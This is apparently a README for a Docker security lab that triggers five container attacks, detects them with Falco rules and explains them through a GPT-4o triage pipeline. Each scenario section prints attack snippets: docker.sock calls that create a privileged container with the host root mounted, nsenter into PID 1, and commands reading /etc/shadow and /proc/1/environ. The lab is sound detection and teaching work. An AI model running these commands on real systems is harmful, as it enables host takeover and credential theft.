# Docker security simulation lab

A hands-on research environment for studying container attack techniques, runtime detection with Falco, and AI-assisted triage. You trigger a real attack, Falco fires a real alert, and a GPT-4o pipeline explains what happened and what should have stopped it.

---

## What this is

This lab runs 13 Docker containers across 6 isolated bridge networks. Five of those containers are attackers. Each one sits next to a victim container and waits for you to pull the trigger. When you do, it executes a real technique — not a simulation flag, not a stub — and Falco catches it via eBPF syscall monitoring. The alert travels over HTTP to a FastAPI gateway, which fans it out to two concurrent GPT-4o calls: one produces a one-line triage summary, the other a structured JSON analysis with MITRE technique, risk score, misconfiguration cause, predicted next move, and a hardened Docker Compose fix.

Everything appears live in a browser dashboard. You can watch the SVG container topology animate as packets travel from the attacker to the Falco node, see MITRE ATT&CK tactic boxes light up, and follow a forensic step-by-step timeline of what the attacker just did.

---

## Architecture overview

```
Browser (localhost:8000/dashboard)
    │  SSE stream  ▲
    │              │ broadcast
    ▼              │
 ai-gateway (FastAPI, port 8000)
    │                    ▲
    │ POST /falco-alert  │ HTTP webhook
    ▼                    │
  Falco (eBPF, modern_ebpf driver)
    │
    │ monitors syscalls from all containers
    ▼
┌─────────────────────────────────────────────────────────────────┐
│  escape-net  │  sock-net  │  lateral-net  │  secrets-net  │  authz-net  │
│  172.20.1/24 │ 172.20.2/24│  172.20.3/24  │  172.20.4/24  │ 172.20.5/24 │
│  ATK  VIC    │  ATK  VIC  │  ATK  VIC-A   │  ATK  VIC     │  ATK  VIC   │
│              │            │        VIC-B  │               │             │
└─────────────────────────────────────────────────────────────────┘
```

Each scenario network is completely isolated — attacker-escape cannot reach victim-sock, for instance. All Falco traffic flows through the monitoring network (`172.20.6.0/24`) that only Falco and the gateway share.

---

## Project structure

```
docker_simulation/
├── docker-compose.yml          # all 13 containers, 6 networks
├── trigger.py                  # CLI to trigger attacks without the browser
├── .env                        # OPENAI_API_KEY (not committed)
│
├── ai-gateway/
│   ├── main.py                 # FastAPI routes: /falco-alert, /dashboard, /stream, /api/*
│   ├── analyzer.py             # parallel GPT-4o calls: triage + deep JSON analysis
│   ├── prompts.py              # system + user messages for both LLM calls
│   ├── state.py                # in-memory alert store + SSE subscriber queues
│   └── dashboard.html          # single-file browser UI (Tailwind, SVG topology, SSE)
│
├── falco/
│   ├── falco.yaml              # engine: modern_ebpf, http_output to ai-gateway
│   └── rules/
│       ├── 00_macros.yaml      # shared macros: spawned_process, open_read
│       ├── escape_rules.yaml
│       ├── sock_rules.yaml
│       ├── lateral_rules.yaml
│       ├── secrets_rules.yaml
│       └── authz_rules.yaml
│
├── attackers/
│   ├── escape/   attack.sh     # traverses /proc/self/fd, triggers proc.cwd rule
│   ├── sock/     attack.py     # hits docker.sock API, spawns privileged container
│   ├── lateral/  attack.sh     # nmap scan + nsenter into PID namespace
│   ├── secrets/  attack.sh     # reads /etc/shadow, dumps /proc/1/environ
│   └── authz/    attack.py     # sends 1.1MB POST to docker.sock (CVE-2026-34040)
│
└── victims/
    ├── escape/    simple Alpine with intentional WORKDIR misconfiguration
    ├── sock/      Alpine with docker.sock bind-mounted (the misconfiguration)
    ├── lateral-a/ simple Alpine target A
    ├── lateral-b/ simple Alpine target B
    └── secrets/   Alpine with real-looking credential env vars
```

---

## The 5 attack scenarios

### Scenario 1 — Container escape via runc fd leak (CVE-2024-21626)

**What happens:** The attacker shell changes its working directory to `/proc/self/fd/`. In a normally-configured container this is harmless, but when a container's `WORKDIR` resolves through an open host-side file descriptor (the condition CVE-2024-21626 exploits), the process's working directory ends up pointing at a path on the *host* filesystem rather than inside the container. From there, the attacker can reach host files by resolving fd symlinks.

**The attack script (`attackers/escape/attack.sh`):**
```bash
ls -la /proc/self/fd/
cd /proc/self/fd/ && pwd
for fd in /proc/self/fd/*; do
    target=$(readlink "$fd" 2>/dev/null || true)
    if [[ "$target" == "/"* ]]; then echo "[!] Host fd: $fd -> $target"; fi
done
```

**The Falco rule that fires:**
```yaml
condition: spawned_process and container and
           (proc.cwd startswith "/proc/self/fd" or proc.cwd startswith "/proc/1/fd")
priority: CRITICAL
```

**The misconfiguration:** `WORKDIR` set to `/proc/self/fd` in the victim's Dockerfile (or any path that traverses through an unintentionally open host fd).

**MITRE technique:** T1611 — Escape to Host

**How to fix it:**
```yaml
security_opt:
  - no-new-privileges:true
read_only: true
```
Set `WORKDIR` to an explicit application directory, never to anything under `/proc`.

---

### Scenario 2 — Docker socket abuse (T1610)

**What happens:** `victim-sock` has `/var/run/docker.sock` bind-mounted into it. That socket is the Docker Engine API. Any process inside the container that can reach it has full control over the Docker daemon — same as having root on the host. The attacker enumerates all running containers, then crafts a JSON payload to create a new privileged container with the host root filesystem mounted at `/host`.

**The attack script (`attackers/sock/attack.py`):**
```python
# enumerate containers
session.get("http+unix://%2Fvar%2Frun%2Fdocker.sock/containers/json?all=true")

# spawn privileged container with host bind mount
payload = {
    "Image": "alpine",
    "HostConfig": {"Binds": ["/:/host:ro"], "Privileged": True}
}
session.post(".../containers/create?name=attacker-spawned", data=json.dumps(payload))
```

**Two Falco rules fire:**
1. `Docker Socket Access from Container` — triggers on `connect` or `sendto` where `fd.name contains "docker.sock"`
2. `New Privileged Container Created via Socket` — triggers when `proc.name in (docker, dockerd)` and cmdline contains `--privileged`

**The misconfiguration:**
```yaml
volumes:
  - /var/run/docker.sock:/var/run/docker.sock  # never do this on a production container
```

**MITRE technique:** T1610 — Deploy Container

**How to fix it:** Remove the socket mount. If a container genuinely needs to manage other containers, use a dedicated Docker management API with scoped access, not the raw socket.

---

### Scenario 3 — Lateral movement via nsenter + nmap (T1046 / T1609)

**What happens:** The attacker starts with a network scan to discover other containers on `172.20.3.0/24`. It finds `victim-lat-a` (port 80) and `victim-lat-b`. Then it uses `nsenter` to enter PID 1's network and mount namespaces — crossing the container boundary without a full escape.

The container has `cap_add: NET_ADMIN` and `cap_add: SYS_PTRACE`, which are the two capabilities nsenter needs to work.

**The attack script (`attackers/lateral/attack.sh`):**
```bash
nmap -sn 172.20.3.0/24                 # subnet discovery
curl victim-lat-a:80                   # probe target
nsenter --target 1 --net --mount       # enter init's namespaces
```

**Two Falco rules fire:**
1. `Unexpected Internal Network Scan` — triggers on `proc.name in (nmap, masscan, zmap)`
2. `Lateral Movement via nsenter` — triggers on `proc.name = "nsenter"`

**The misconfiguration:**
```yaml
cap_add:
  - NET_ADMIN    # not needed for most applications
  - SYS_PTRACE  # enables ptrace and namespace entry
```

**MITRE techniques:** T1046 (Network Service Discovery), T1609 (Container Administration Command)

**How to fix it:**
```yaml
cap_drop:
  - ALL
cap_add:
  - NET_BIND_SERVICE  # only if the app needs to bind ports below 1024
```

---

### Scenario 4 — Secrets exfiltration (T1552)

**What happens:** `victim-secrets` has plaintext credentials in its environment variables (`DATABASE_PASSWORD`, `API_KEY`, `JWT_SECRET`). The attacker reads `/etc/shadow` for password hashes, scans for Kubernetes secret mount paths, then dumps `/proc/1/environ` — the init process's environment — which leaks every env var the victim container was started with.

**The attack script (`attackers/secrets/attack.sh`):**
```bash
cat /etc/shadow
cat /proc/1/environ | tr '\0' '\n' | grep -iE "(key|secret|password|token|api)"
env | grep -iE "(key|secret|password|token)"
```

The `attacker-secrets` container runs with `pid: host`, which means it shares the host's PID namespace. `/proc/1/environ` becomes `/proc/<victim_pid>/environ` — the attacker can read any process's environment on the host.

**Two Falco rules fire:**
1. `Sensitive File Read in Container` — triggers when `fd.name = "/etc/shadow"` on an `open_read`
2. `Process Environment Dump` — triggers when `fd.name glob "/proc/*/environ"` on an `open_read`

**The misconfiguration:** `pid: host` in the attacker container, and plaintext secrets in env vars instead of a secret manager.

**MITRE technique:** T1552 — Unsecured Credentials

**How to fix it:**
```yaml
# never use pid: host
# store secrets in Docker secrets or a vault, not env vars
secrets:
  - db_password
environment: []
```

---

### Scenario 5 — AuthZ plugin bypass (CVE-2026-34040)

**What happens:** Docker's authorization plugin system inspects the request body before deciding whether to allow an API call. CVE-2026-34040 describes a condition where a body exceeding ~1MB causes the middleware to drop it before the AuthZ plugin sees it — the plugin receives an empty body and, depending on its policy, may allow the request through.

The attacker crafts a legitimate `POST /containers/create` request with a 1.1MB JSON body (padded with a dummy field), then sends it directly over the raw Unix socket. If the plugin passes it through, a privileged container with the host root mounted gets created without authorization.

**The attack script (`attackers/authz/attack.py`):**
```python
container_config = {
    "Image": "alpine",
    "HostConfig": {"Binds": ["/:/host:ro"], "Privileged": True},
    "_cve_padding": "A" * 1_100_000   # exceeds AuthZ inspection threshold
}
body = json.dumps(container_config).encode()
# raw socket send — bypass Python HTTP client entirely
sock.connect("/var/run/docker.sock")
sock.sendall(http_request_bytes + body)
```

**The Falco rule that fires:**
```yaml
condition: container and fd.type = "unix" and fd.name contains "docker.sock" and
           evt.type in (connect, sendto)
priority: CRITICAL
```

**MITRE technique:** T1610 — Deploy Container (with Defense Evasion via T1562 — Impair Defenses)

**How to fix it:** Patch Docker Engine. As a defense-in-depth measure, remove docker.sock mounts from all containers that don't absolutely require them, and run Docker with a secondary authorization layer (OPA, Open Policy Agent) that validates based on the parsed request, not the raw body.

---

## How the AI analysis works

Every Falco alert triggers two concurrent GPT-4o calls via LiteLLM. They run in parallel with `asyncio.gather`.

**Call 1 — triage (60 tokens max):**
```
System: You are a container security triage analyst. Respond with exactly ONE sentence:
        [SEVERITY: LOW|MEDIUM|HIGH|CRITICAL] <what happened in plain English>.
User: Falco alert JSON: {...}
```

**Call 2 — deep analysis (500 tokens, JSON mode):**
```
System: Respond with a JSON object containing:
        - mitre_technique
        - what_happened
        - misconfiguration
        - predicted_next_move
        - risk_score (0–10)
        - hardened_config (Docker Compose YAML, max 5 lines)
User: Falco alert JSON: {...}
```

The gateway extracts `severity` from the triage text (looks for CRITICAL/HIGH/MEDIUM/LOW), then broadcasts everything over SSE to all connected browser tabs. The dashboard renders alert cards with expandable deep analysis panels.

---

## How Falco works here

Falco runs with `engine.kind: modern_ebpf` — no kernel module, no precompiled probe. It uses CO-RE (Compile Once, Run Everywhere) eBPF programs that attach to kernel tracepoints and read syscall arguments directly. It sits on every network (`escape-net` through `monitoring`) so it can observe container metadata (image name, container name) alongside syscall data.

The `http_output` block in `falco.yaml` sends every matched alert as a JSON POST to `http://ai-gateway:8000/falco-alert`. No Kafka, no syslog — just a direct HTTP webhook.

Rule priorities used in this lab: CRITICAL, WARNING, NOTICE. (Valid Falco priority values are EMERGENCY, ALERT, CRITICAL, ERROR, WARNING, NOTICE, INFORMATIONAL, DEBUG. HIGH and MEDIUM are not valid and will crash Falco at startup.)

---

## The dashboard

Everything runs in `ai-gateway/dashboard.html`. No build step. No React. Just a single HTML file served by FastAPI.

**SSE stream:** The browser opens a persistent `EventSource` connection to `/stream`. The gateway holds an `asyncio.Queue` per subscriber. When `broadcast()` fires, it pushes to every queue simultaneously. The browser renders new alert cards as they arrive, without polling.

**2×2 grid layout:** The screen is always split into four panels — AI Analysis (top-left), Attack Simulation (top-right), Falco Logs (bottom-left), Attack History (bottom-right). Each panel has a fullscreen toggle that expands it to `position: fixed; inset: 0` without hiding the others.

**Attack simulation panel:** An SVG at 900×540 viewBox shows five network cluster boxes arranged pentagon-style around a central Falco node. When an alert arrives, the attacker circle pulses red, a packet path animates via `stroke-dashoffset` from attacker to Falco, then the victim glows green and a DETECTED badge pops in. The MITRE tactic boxes on the right light up with persistent indigo borders and technique chips (e.g. T1611) that don't reset until you hit Clear.

**Scenario buttons:** A horizontal strip above the grid shows all 5 scenarios as compact trigger buttons. The health indicators next to them poll `/api/health` every 8 seconds, hitting each attacker's `/health` endpoint to check if it's up.

---

## Quick start (Linux / Mac)

```bash
# 1. clone or copy this folder, then:
echo "OPENAI_API_KEY=sk-your-key-here" > .env

# 2. install host-side Python dependencies (for trigger.py)
pip install -r requirements.txt

# 3. start everything
docker compose up --build -d

# 4. wait ~60 seconds for Falco to load its eBPF probe, then:
docker logs falco --tail 5
# should show: Starting gRPC server...

# 5. open the dashboard
xdg-open http://localhost:8000/dashboard   # Linux
open http://localhost:8000/dashboard       # Mac
```

Click any scenario's Trigger button. Within 5–15 seconds, an alert card appears in the AI Analysis panel.

---

## Python dependencies

The root `requirements.txt` covers everything you need to run `trigger.py` locally and, if needed, the ai-gateway or attacker code outside Docker:

```
requests>=2.31.0          # trigger.py — HTTP calls to attacker containers

fastapi==0.115.0          # ai-gateway
uvicorn[standard]==0.30.6
litellm==1.83.3           # GPT-4o calls via OpenAI-compatible API
httpx==0.28.1             # async HTTP client for attacker health checks
sse-starlette==2.1.3      # Server-Sent Events streaming to browser

flask==3.0.3              # all 5 attacker containers (HTTP trigger server)
requests-unixsocket2==0.4.0  # attacker-sock: Python HTTP over Unix socket
```

Install with:

```bash
pip install -r requirements.txt
```

Each Docker image has its own scoped `requirements.txt` under `ai-gateway/` and `attackers/<name>/` — those are what gets installed inside the containers at build time. The root file exists for running things locally without Docker.

---

## CLI trigger (no browser required)

```bash
# install dependencies first (once)
pip install -r requirements.txt

python trigger.py --health    # check all 5 attackers are up
python trigger.py --attack escape
python trigger.py --attack all    # all 5 with 10-second gaps between each
```

AI analysis prints to the ai-gateway container log:

```bash
docker logs ai-gateway -f
```

---

## Stopping the lab

```bash
docker compose down
```

This removes containers and networks. Your `.env` and all source files are untouched.

---

## Troubleshooting

**Dashboard shows "Reconnecting..." after startup**
The ai-gateway is still starting. Wait 30 seconds and refresh.

**No alert cards appear after triggering**
Check whether Falco is receiving syscall events:
```bash
docker logs falco --tail 30
```
Then check whether the gateway received the alert:
```bash
docker logs ai-gateway --tail 30
```
If you see `[ANALYSIS ERROR]`, the OpenAI API key in `.env` is wrong or the account has no credits.

**Falco logs show `scap_init failed` or BPF errors**
The host kernel needs BTF support. Check:
```bash
ls /sys/kernel/btf/vmlinux
```
If the file is missing, your kernel is too old (need 5.8+ with `CONFIG_DEBUG_INFO_BTF=y`). Ubuntu 20.04 HWE kernel and later work fine.

**Attacker containers keep restarting**
```bash
docker ps -a
docker logs attacker-escape
```
A crash usually means a dependency issue with the victim not being ready. Wait 30 seconds after `docker compose up` completes before triggering.

**Dashboard shows stale content after editing dashboard.html**
The ai-gateway image bakes in the HTML at build time. Rebuild after any change:
```bash
docker compose up --build -d ai-gateway
```

---

## Security note

This lab intentionally creates vulnerable containers: exposed docker.sock mounts, `pid: host`, excessive capabilities, plaintext credentials in env vars. Run it only on an isolated development machine or VM, not on a shared server. The `.env` file is excluded from git via `.gitignore` — never commit your API key.
